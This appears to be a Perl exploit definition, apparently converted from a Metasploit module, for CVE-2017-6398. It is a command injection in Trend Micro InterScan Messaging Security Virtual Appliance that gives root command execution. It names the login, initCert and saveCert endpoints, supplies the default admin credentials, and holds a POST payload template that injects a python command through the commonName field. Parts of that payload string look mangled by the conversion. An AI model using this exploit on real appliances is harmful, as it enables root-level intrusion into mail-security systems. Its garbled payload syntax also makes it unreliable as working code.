my $EXPLOIT = {
  "CVE"                              => "CVE-2017-6398",
  "DESCRIPTION"                      => "

        This module exploits a command injection vulnerability in the Trend Micro

        IMSVA product. An authenticated user can execute a terminal command under

        the context of the web server user which is root. Besides, default installation

        of IMSVA comes with a default administrator credentials.



        saveCert.imss endpoint takes several user inputs and performs blacklisting.

        After that it use them as argument of predefined operating system command

        without proper sanitation. However, due to improper blacklisting rule it's possible to inject

        arbitrary commands into it. InterScan Messaging Security prior to 9.1.-1600 affected by this issue.



        This module was tested against IMSVA 9.1-1600.

      ",
  "METHOD"                           => "POST",
  "MSF_MODULE"                       => "trend_micro_imsva_exec",
  "PATH"                             => "login.imss?mode=__MODE__&",
  "PATHS"                            => ["login.imss", "initCert.imss", "saveCert.imss", ""],
  "PAYLOAD"                          => "certName=__CERTNAME__&certType=__CERTTYPE__&keyLength=__KEYLENGTH__&countryCode=TR&state=__STATE__&locality=__LOCALITY__&org=__ORG__&orgUnit=__ORGUNIT__&commonName=__R__;python-c__PAYLOAD\\.ENCODED\\.GSUB\\(\\\\\\\\&emailAddress=__R__\@mail.com&validDays=&id=&",
  "REFERENCES"                       => [
                                          "https://pentest.blog/advisory-trend-micro-interscan-messaging-security-virtual-appliance-remote-code-execution/",
                                        ],
  "THE USERTITLE FOR AUTHENTICATION" => "admin",
  "TITLE"                            => "Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution",
  VARIABLES => {
    'CERTNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'MODE' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The target URI of the Trend Micro IMSVA",
  VALUE => "/",
},
    'ORGUNIT' =>       { DESCRIPTION => "", VALUE => "" },
    'USERID' =>       { DESCRIPTION => "", VALUE => "" },
    'ORG' =>       { DESCRIPTION => "", VALUE => "" },
    'JSESSIONID' =>       { DESCRIPTION => "", VALUE => "" },
    'R' =>       { DESCRIPTION => "", VALUE => "" },
    'KEYLENGTH' =>       { DESCRIPTION => "", VALUE => "" },
    'CERTTYPE' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "The password for authentication", VALUE => "imsva" },
    'LOCALITY' =>       { DESCRIPTION => "", VALUE => "" },
    'PWDFAKE' =>       { DESCRIPTION => "", VALUE => "" },
    'STATE' =>       { DESCRIPTION => "", VALUE => "" },
  },
